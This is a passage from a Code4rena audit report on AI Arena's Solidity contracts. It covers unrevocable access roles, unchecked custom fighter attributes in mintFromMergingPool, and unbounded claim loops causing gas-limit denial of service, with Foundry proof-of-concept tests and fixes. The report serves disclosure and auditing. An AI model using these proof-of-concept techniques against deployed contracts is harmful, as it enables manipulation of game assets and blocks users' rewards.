## [[M-02] Minter / Staker / Spender roles can never be revoked](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1507)
*Submitted by [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1507), also found by [0xvj](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2093), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2092), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2088), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2084), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2080), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2075), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1904), [sandy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1822), [favelanky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1813), [josephdara](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1646), MidgarAudits ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1394), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1392)), [\_eperezok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/776), [SovaSlava](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/695), [lil\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/583), [kutugu](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/454), [zaevlad](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/278), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/119), [shaflow2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/20), [pynschon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/640), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2081), [0xE1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/678), [PetarTolev](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2071), [c0pp3rscr3w3r](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1882), [0xblackskull](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1878), [Greed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1682), [0xgrbr](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1485), Sabit ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1166), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1164), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1162)), [Tychai0s](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/877), and [Timenov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/127)*

From [Neuron::addMinter](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/Neuron.sol#L93-L96) and [AccessControl::setupRole](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/access/AccessControl.sol#L194-L207)

```solidity
    function addMinter(address newMinterAddress) external {
        require(msg.sender == _ownerAddress);
        _setupRole(MINTER_ROLE, newMinterAddress);
    }

    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

```

*   Roles of minter, staker, spender can never be revoked due to missing default admin implementation. The `DEFAULT_ADMIN_ROLE` = 0x00 which is default role which is admin to all the roles, and the real contract owner should  own this role, since it is not granted, the owner cannot govern the roles.

*   Another wrong implemnatation is using `_setupRole` to grant roles intead of using `_grantRole`, because of the warnings in the library contract.

From [Openzeppelin::AccessControl](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/access/AccessControl.sol#L40-L47) and [AccessControl::setupRole](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/access/AccessControl.sol#L194-L207)

```solidity

* [WARNING]
    * ====
    * This function should only be called from the constructor when setting
    * up the initial roles for the system.
    *
    * Using this function in any other way is effectively circumventing the admin
    * system imposed by {AccessControl}.
    * ====
    *
    * NOTE: This function is deprecated in favor of {_grantRole}.
    */
    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    * Roles can be granted and revoked dynamically via the {grantRole} and
    * {revokeRole} functions. Each role has an associated admin role, and only
    * accounts that have a role's admin role can call {grantRole} and {revokeRole}.
    *
    * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means
    * that only accounts with this role will be able to grant or revoke other
    * roles. More complex role relationships can be created by using
    * {_setRoleAdmin}.
    *
    * WARNING: The `DEFAULT_ADMIN_ROLE` is also its own admin: it has permission to
    * grant and revoke this role. Extra precautions should be taken to secure
    * accounts that have been granted it.
    */

```

### Proof of Concept

*   As you can see the owner cannot revoke becasue there is no admin for that role, owner should be a default admin for all the roles granted.

```
[PASS] test_POC_Revoke() (gas: 72392)
Traces:
  [72392] NeuronTest::test_POC_Revoke() 
    ├─ [27181] Neuron::addMinter(NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) 
    │   ├─ emit RoleGranted(role: 0x9f2df0fed2c77648de5860a4cc508cd0818c85b8b8a1ab4ceeef8d981c8956a6, account: NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], sender: NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← ()
    ├─ [0] VM::expectRevert() 
    │   └─ ← ()
    ├─ [34420] Neuron::revokeRole(0x9f2df0fed2c77648de5860a4cc508cd0818c85b8b8a1ab4ceeef8d981c8956a6, NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) 
    │   └─ ← "AccessControl: account 0x7fa9385be102ac3eac297483dd6233d62b3e1496 is missing role 0x0000000000000000000000000000000000000000000000000000000000000000"
    └─ ← ()
```

- Now paste the below POC into [test/Neuron.t.sol](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/test/Neuron.t.sol#L39) and run `forge t --mt test_POC_Revoke -vvvv`.

```solidity

    function test_POC_Revoke() external {
        _neuronContract.addMinter(_ownerAddress);

        vm.expectRevert();
        _neuronContract.revokeRole(keccak256("MINTER_ROLE"), _ownerAddress);
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Modify the constructor on [Neuron.sol](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/Neuron.sol#L68-L77) to grant default admin role to owner.

```diff
    constructor(address ownerAddress, address treasuryAddress_, address contributorAddress)
        ERC20("Neuron", "NRN")
    {
        _ownerAddress = ownerAddress;
        treasuryAddress = treasuryAddress_;
        isAdmin[_ownerAddress] = true;
        _mint(treasuryAddress, INITIAL_TREASURY_MINT);
        _mint(contributorAddress, INITIAL_CONTRIBUTOR_MINT);

+       _grantRole(DEFAULT_ADMIN_ROLE, _ownerAddress);
    }
```

**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1507#issuecomment-1978135833):**
 > Selecting as best report because it also mentions that `_grantRole` should be used instead of `_setupRole`.
 > 
 > I'm excluding admin error in this. Simply about functionality: not being able to revoke roles might be problematic for deprecation / migration purposes.



***

## [[M-03] Fighter created by `mintFromMergingPool` can have arbitrary weight and element](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932)
*Submitted by [ktg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932), also found by [visualbits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2016), [d3e4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1998), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1996), [dutra](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1879), [niser93](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1855), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1854), [denzi\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1806), [Silvermist](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1799), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1736), [Tumelo\_Crypto](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1704), [givn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1688), [Blank\_Space](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1679), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1670), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1632), [Matue](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1566), [stakog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1500), [0xWallSecurity](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1418), [FloatingPragma](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1411), [ahmedaghadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1405), [aslanbek](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1351), [agadzhalov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1323), [Topmark](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1319), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1272), [\_eperezok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1252), [AlexCzm](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1219), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1180), [petro\_1912](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1131), [Tendency](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1112), [BARW](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1109), [peter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1080), [ke1caM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1042), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1015), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/951), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/914), [0xvj](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/783), [pkqs90](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/767), [cats](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/725), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/621), [rspadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/511), [krikolkk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/418), [handsomegiraffe](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/394), [Giorgio](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/384), [0xlemon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/264), [kiqo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/242), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/228), [0xRiO](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/226), [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/67), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2089), [0xDetermination](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2072), and [sl1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2070)*

<https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L313-L331><br>
<https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L139-L167>

*   Fighter created by mintFromMergingPool can have arbitrary weight and element like 0 or 2&ast;&ast;256 - 1
*   Invalid weight and element could greatly affect AI Arena battles.

### Proof of Concept

When someone claim their nft rewards from MergingPool, they can input `customeAttributes` and create fighters with arbitrary values since currently there is no check on `customeAttributes` and it could varies from 0 to 2&ast;&ast;256 - 1 (type(uint256).max):

<Details>

```solidity
function claimRewards(
        string[] calldata modelURIs, 
        string[] calldata modelTypes,
        uint256[2][] calldata customAttributes
    ) 
        external 
    {
     ....
        
             _fighterFarmInstance.mintFromMergingPool(
                        msg.sender,
                        modelURIs[claimIndex],
                        modelTypes[claimIndex],
                        customAttributes[claimIndex]
                    );
                   
          
    ....
    }

function mintFromMergingPool(
        address to, 
        string calldata modelHash, 
        string calldata modelType, 
        uint256[2] calldata customAttributes
    ) 
        public 
    {
        require(msg.sender == _mergingPoolAddress);
        _createNewFighter(
            to, 
            uint256(keccak256(abi.encode(msg.sender, fighters.length))), 
            modelHash, 
            modelType,
            0,
            0,
            customAttributes
        );
    }
```
</details>

This allow creating fighters with element and weight range from 0 to 2&ast;&ast;256 - 1 and can have negative impact on AI Arena matches according to the doc here <https://docs.aiarena.io/gaming-competition/nft-makeup>, for example:

*   Weight is described in the doc as `used to calculate how far the fighter moves when being knocked back.`. If an nft has extremely large weight like 2&ast;&ast;256- 1, then it could never be knocked back
*   Element can only be one of Fire, Electricity or Water, an nft with element outside of this list could be created.

Below is a POC, save the test case to contract `MergingPoolTest` under file `test/MergingPool.t.sol` and run it using command:
`forge test --match-path test/MergingPool.t.sol --match-test testClaimRewardsArbitraryElementAndWeight -vvvv`

<details>

```solidity
function testClaimRewardsArbitraryElementAndWeight() public {
        _mintFromMergingPool(_ownerAddress);
        _mintFromMergingPool(_DELEGATED_ADDRESS);
        assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);
        assertEq(_fighterFarmContract.ownerOf(1), _DELEGATED_ADDRESS);
        uint256[] memory _winners = new uint256[](2);
        _winners[0] = 0;
        _winners[1] = 1;
        // winners of roundId 0 are picked
        _mergingPoolContract.pickWinner(_winners);
        assertEq(_mergingPoolContract.isSelectionComplete(0), true);
        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);
        // winner matches ownerOf tokenId
        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == _DELEGATED_ADDRESS, true);
        string[] memory _modelURIs = new string[](2);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        string[] memory _modelTypes = new string[](2);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](2);
        _customAttributes[0][0] = uint256(0);
        _customAttributes[0][1] = uint256(type(uint256).max);
        _customAttributes[1][0] = uint256(type(uint256).max);
        _customAttributes[1][1] = uint256(0);
        // winners of roundId 1 are picked
        _mergingPoolContract.pickWinner(_winners);
        // winner claims rewards for previous roundIds
        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);

        // Fighter 2 has 2**256 weight and element = 0
        (, ,uint256 weight , uint256 element , , , ) = _fighterFarmContract.getAllFighterInfo(2);
        assertEq(weight, 2**256 - 1);
        assertEq(element, 0);

        // Fighter 3 has 0 weight and 2**256 element
        (, , weight ,  element , , , ) = _fighterFarmContract.getAllFighterInfo(3);
        assertEq(weight, 0);
        assertEq(element, 2**256 - 1);

    }
```

</details>

### Recommended Mitigation Steps

I recommend checking `customAttributes` in function `mintFromMergingPool` and only restrict `weight` and `element` in predefined ranges. For example, weight must be in range \[65, 95], element must be in range \[0,2].

**[brandinho (AI Arena) confirmed via duplicate issue \#1670](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1670#issuecomment-1985801932)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/16

**Status:** Not fully mitigated. Full details in reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/8) and niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/29), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/13)), and also included in the [Mitigation Review](#mitigation-review) section below.



***

## [[M-04] DoS in `MergingPool::claimRewards` function and potential DoS in `RankedBattle::claimNRN` function if called after a significant amount of rounds passed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/868)
*Submitted by [ahmedaghadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/868), also found by SpicyMeatball ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2060), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/239)), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2059), [0xKowalski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2058), ktg ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2057), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/937)), 0xDetermination ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2056), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1781)), [Ryonen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2055), sl1 ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2053), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/518)), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2052), klau5 ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2051), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/874), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/216)), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2006), [pontifex](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1899), [Nyxaris](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1897), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1810), [inzinko](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1804), grearlake ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1801), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1796)), [Honour](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1777), [cu5t0mpeo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1753), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1713), [Avci](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1681), [Greed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1680), [josephdara](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1645), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1592), [DeFiHackLabs](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1563), [0xPluto](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1554), radev\_sw ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1541), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1520)), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1356), [KmanOfficial](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1285), [soliditywala](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1234), [ladboy233](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1222), [AlexCzm](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1142), [jesusrod15](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1130), [erosjohn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1123), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1097), [taner2344](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1078), [Krace](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1030), ke1caM ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1029), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1024)), [BigVeezus](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1020), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/999), peanuts ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/988), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/872)), McToady ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/948), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/946)), [Giorgio](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/885), [0x13](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/881), [deadrxsezzz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/827), [SovaSlava](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/826), almurhasan ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/802), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/801)), [0xvj](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/791), \_eperezok ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/777), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/775)), [emrekocak](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/740), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/611), [pipidu83](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/588), [y4y](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/486), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/473), BARW ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/470), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/465)), [djxploit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/432), [sobieski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/392), ReadyPlayer2 ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/341), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/340)), [Fitro](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/336), [0xAleko](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/313), [zaevlad](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/270), [GoSlang](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/213), [0xRiO](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/181), [Cryptor](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/152), [Kalogerone](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/142), [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/87), [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2054), [yovchev\_yoan](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1728), and [dvrkzy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/229)*

The `MergingPool::claimRewards` function loop through last claimed round ID to the latest round ID ( <https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L139> ):

```solidity
function claimRewards(
    string[] calldata modelURIs,
    string[] calldata modelTypes,
    uint256[2][] calldata customAttributes
)
    external
{
    uint256 winnersLength;
    uint32 claimIndex = 0;
@->    uint32 lowerBound = numRoundsClaimed[msg.sender];
@->    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
        numRoundsClaimed[msg.sender] += 1;
        winnersLength = winnerAddresses[currentRound].length;
        for (uint32 j = 0; j < winnersLength; j++) {
            if (msg.sender == winnerAddresses[currentRound][j]) {
                _fighterFarmInstance.mintFromMergingPool(
                    msg.sender,
                    modelURIs[claimIndex],
                    modelTypes[claimIndex],
                    customAttributes[claimIndex]
                );
                claimIndex += 1;
            }
        }
    }
    if (claimIndex > 0) {
        emit Claimed(msg.sender, claimIndex);
    }
}
```

Also there's another nested loop which loops through all the winners each round. Thus, it will become very expensive to claim rewards and eventually leads to block gas limit. Due to which some users may never be able to claim their rewards.

Therefore, If user try to claim their rewards after many rounds has passed then due to the above mentioned loops, it will consume a lot of gas and eventually leads to block gas limit.

Similarly, the `RankedBattle::claimNRN` function loop through last claimed round ID to the latest round ID ( <https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L294> ) :

```solidity
function claimNRN() external {
    require(numRoundsClaimed[msg.sender] < roundId, "Already claimed NRNs for this period");
    uint256 claimableNRN = 0;
    uint256 nrnDistribution;
@->    uint32 lowerBound = numRoundsClaimed[msg.sender];
@->    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
        nrnDistribution = getNrnDistribution(currentRound);
        claimableNRN += (
            accumulatedPointsPerAddress[msg.sender][currentRound] * nrnDistribution
        ) / totalAccumulatedPoints[currentRound];
        numRoundsClaimed[msg.sender] += 1;
    }
    if (claimableNRN > 0) {
        amountClaimed[msg.sender] += claimableNRN;
        _neuronInstance.mint(msg.sender, claimableNRN);
        emit Claimed(msg.sender, claimableNRN);
    }
}
```

Although, it's relatively difficult to reach the block gas limit in `claimNRN` function as compared to `claimRewards` function, but still it's possible.

### Proof of Concept

For `claimRewards` function, Add the below function in `MergingPool.t.sol`:

<details>

```solidity
function testClaimRewardsDOS() public {
    address user1 = vm.addr(1);
    address user2 = vm.addr(2);
    address user3 = vm.addr(3);

    _mintFromMergingPool(user1);
    _mintFromMergingPool(user2);
    _mintFromMergingPool(user3);

    uint offset = 35;
    uint totalWin = 9;

    uint256[] memory _winnersGeneral = new uint256[](2);
    _winnersGeneral[0] = 0;
    _winnersGeneral[1] = 1;

    uint256[] memory _winnersUser = new uint256[](2);
    _winnersUser[0] = 0;
    _winnersUser[1] = 2;
    for (uint i = 0; i < offset * totalWin; i++) {
        if (i % offset == 0) {
            _mergingPoolContract.pickWinner(_winnersUser);
        } else {
            _mergingPoolContract.pickWinner(_winnersGeneral);
        }
    }

    string[] memory _modelURIs = new string[](totalWin);
    string[] memory _modelTypes = new string[](totalWin);
    uint256[2][] memory _customAttributes = new uint256[2][](totalWin);
    for (uint i = 0; i < totalWin; i++) {
        _modelURIs[
            i
        ] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelTypes[i] = "original";
        _customAttributes[i][0] = uint256(1);
        _customAttributes[i][1] = uint256(80);
    }
    vm.prank(user3);
    uint gasBefore = gasleft();
    _mergingPoolContract.claimRewards(
        _modelURIs,
        _modelTypes,
        _customAttributes
    );
    uint gasAfter = gasleft();
    uint gasDiff = gasBefore - gasAfter;
    emit log_uint(gasDiff);
    uint256 numRewards = _mergingPoolContract.getUnclaimedRewards(user3);
    assertEq(numRewards, 0);
    assertGt(gasDiff, 4_000_000);
}
```
</details>

You can run the test by:

```bash
forge test --mt testClaimRewardsDOS -vv
```

Here I had considered 3 users, user1, user2, and user3. After each `offset` rounds, I picked `user3` as a winner. There were total of 315 ( `offset` &ast; `totalWin` ) rounds passed and `user3` won in 9 of them. Then I tried to claim rewards for `user3` and it consumed more than 4M gas.

Also the more the round in which `user3` has won, the more gas it will consume. Even if `offset` is 1 and `totalWin` is 9 ( i.e total of 9 rounds out of which `user3` won in 9 of them ), it will consume more than 3.4M gas.

Also, we've considered only 2 winners per round, as the number of winners increases, the gas consumption will also increase due to the nested loop which loops through all the winners each round.

So if any user claim their rewards after many rounds has passed or if they have won in many rounds, it will consume a lot of gas and eventually leads to block gas limit.

For `claimNRN` function, Add the below function in `RankedBattle.t.sol`:

<details>

```solidity
function testClaimNRNDoS() public {
    _neuronContract.addSpender(address(_gameItemsContract));
    _gameItemsContract.instantiateNeuronContract(address(_neuronContract));
    _gameItemsContract.createGameItem(
        "Battery",
        "https://ipfs.io/ipfs/",
        true,
        true,
        10_000,
        1 * 10 ** 18,
        type(uint16).max
    );
    _gameItemsContract.setAllowedBurningAddresses(
        address(_voltageManagerContract)
    );

    address staker = vm.addr(3);
    _mintFromMergingPool(staker);
    vm.prank(_treasuryAddress);
    _neuronContract.transfer(staker, 400_000 * 10 ** 18);
    vm.prank(staker);
    _rankedBattleContract.stakeNRN(30_000 * 10 ** 18, 0);
    assertEq(_rankedBattleContract.amountStaked(0), 30_000 * 10 ** 18);

    address claimee = vm.addr(4);
    _mintFromMergingPool(claimee);
    vm.prank(_treasuryAddress);
    _neuronContract.transfer(claimee, 400_000 * 10 ** 18);
    vm.prank(claimee);
    _rankedBattleContract.stakeNRN(40_000 * 10 ** 18, 1);
    assertEq(_rankedBattleContract.amountStaked(1), 40_000 * 10 ** 18);

    uint offset = 35;
    uint totalWin = 9;
    for (uint i = 0; i < offset * totalWin; i++) {
        // 0 win
        // 1 tie
        // 2 loss
        if (i % offset == 0) {
            uint256 currentVoltage = _voltageManagerContract.ownerVoltage(
                claimee
            );
            if (currentVoltage < 100) {
                vm.prank(claimee);
                _gameItemsContract.mint(0, 1); //paying 1 $NRN for 1 batteries
                vm.prank(claimee);
                _voltageManagerContract.useVoltageBattery();
            }

            vm.prank(address(_GAME_SERVER_ADDRESS));
            _rankedBattleContract.updateBattleRecord(1, 50, 0, 1500, true);
        } else {
            uint256 currentVoltage = _voltageManagerContract.ownerVoltage(
                staker
            );
            if (currentVoltage < 100) {
                vm.prank(staker);
                _gameItemsContract.mint(0, 1); //paying 1 $NRN for 1 batteries
                vm.prank(staker);
                _voltageManagerContract.useVoltageBattery();
            }

            vm.prank(address(_GAME_SERVER_ADDRESS));
            _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true);
        }
        _rankedBattleContract.setNewRound();
    }

    uint256 gasBefore = gasleft();
    vm.prank(claimee);
    _rankedBattleContract.claimNRN();
    uint256 gasAfter = gasleft();
    uint256 gasDiff = gasBefore - gasAfter;
    emit log_uint(gasDiff);
    assertGt(gasDiff, 1_000_000);
}
```
</details>

You can run the test by:

```bash
forge test --mt testClaimNRNDoS -vv
```

